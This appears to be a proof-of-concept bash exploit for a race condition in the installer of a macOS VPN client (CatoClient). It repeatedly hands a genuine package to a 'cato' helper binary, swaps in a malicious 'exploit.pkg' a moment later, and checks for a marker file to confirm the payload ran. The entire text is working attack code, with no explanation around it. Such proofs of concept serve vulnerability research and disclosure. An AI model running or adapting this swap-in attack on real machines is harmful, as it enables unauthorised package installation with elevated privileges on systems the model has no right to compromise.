#!/bin/bash

ORIGINAL=/Users/demon/Downloads/CatoClient-2.pkg
FAKE=/Users/demon/Downloads/exploit.pkg
TEMP=/tmp/expl.pkg

while [ true ]
do
    cp "${ORIGINAL}" "${TEMP}"

    ./cato "${TEMP}" &
    sleep 0.1
    cp "${FAKE}" "${TEMP}"
    sleep 4
    stat /tmp/himynameis > /dev/null 2>&1 && exit 0
done
